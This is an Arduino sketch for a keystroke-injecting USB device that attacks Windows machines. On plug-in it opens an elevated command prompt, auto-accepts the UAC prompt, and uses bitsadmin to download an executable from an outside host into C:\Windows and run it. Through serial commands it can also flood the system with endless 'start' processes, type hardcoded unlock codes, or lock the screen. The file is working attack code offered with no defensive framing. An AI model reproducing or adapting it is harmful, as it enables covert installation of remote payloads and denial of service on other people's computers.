#include "Keyboard.h"

void typeKey(int key, int count = 1){
  int i = 0;
  
  while(i < count){
    Keyboard.press(key);
    delay(300);
    Keyboard.release(key);
    i++;
  }
}

void setup() {
  Keyboard.begin();
  delay(500);
  Serial.begin(9600);
  delay(10000);
  executeAdmin("cmd.exe");
  delay(300);
  Keyboard.print("bitsadmin.exe /transfer 'JobName' https://site.ru/server_part/win.exe C:");
  Keyboard.write(92);
  Keyboard.print("Windows");
  Keyboard.write(92);
  Keyboard.print("Wins.exe");
  delay(400);
  typeKey(KEY_RETURN);
  delay(25000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(200);
  Keyboard.releaseAll();

  executeAdmin("cmd.exe");
  delay(300);
  Keyboard.print("cd /");
  delay(100);
  typeKey(KEY_RETURN);
  delay(100);
  
  Keyboard.print("cd Windows");
  delay(100);
  typeKey(KEY_RETURN);
  delay(100);

  Keyboard.print("start Wins.exe");
  delay(100);
  typeKey(KEY_RETURN);
  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(200);
  Keyboard.releaseAll();
}

void loop() {
  customSwitch(readData(500));
}

void executeAdmin(String cmd) {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print("r");
  delay(100);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print(cmd);
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.print("y");
  delay(300);
  Keyboard.releaseAll();
}

void execute(String text) {
  Keyboard.releaseAll();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.print('r');
  Keyboard.release(KEY_LEFT_GUI);
  delay(300);
  Keyboard.print(text);
  delay(300);
  Keyboard.press(KEY_RETURN);
}

String readData(int delay_return){
  String text = "";
  while(Serial.available()){
    text += (char) Serial.read();
  }
  
  delay(delay_return);
  return text;
}

bool customSwitch(String value){
  if(value == "cmd"){
    execute("cmd.exe");
    
    while(true){
      Keyboard.print("start");
      typeKey(KEY_RETURN);
      delay(100);
    }
    
    return true;
  }

  if(value == "unblock7"){
    delay(500);
    Keyboard.releaseAll();
    Keyboard.print("100200300200100");
    delay(500);
    typeKey(KEY_RETURN);
    
    return true;
  }

  if(value == "unblock10"){
    delay(500);
    Keyboard.releaseAll();
    typeKey(KEY_RETURN);
    delay(500);
    Keyboard.print("19611956");
    delay(500);
    typeKey(KEY_RETURN);
    
    return true;
  }

  if(value == "block"){
    Keyboard.releaseAll();
    Keyboard.press(KEY_LEFT_GUI);
    delay(200);
    Keyboard.print("l");
    delay(100);
    Keyboard.releaseAll();
    
    return true;
  }
}
